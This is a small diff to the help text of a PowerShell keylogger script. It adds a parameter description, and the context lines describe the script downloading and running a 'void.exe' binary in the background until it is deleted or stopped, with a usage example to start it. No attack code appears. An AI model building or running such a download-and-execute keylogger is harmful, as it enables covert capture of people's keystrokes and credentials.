@@ -8,6 +8,9 @@
    in background mode and only stops if void.exe binary
    its deleted or is process {void.exe} its stoped.
 
+.Parameter Keylogger
+   Accepts Start and Stop @arguments
+
 .EXAMPLE
    PS C:\> .\Keylogger.ps1 -Keylogger Start
    Download/Execute void.exe in child process
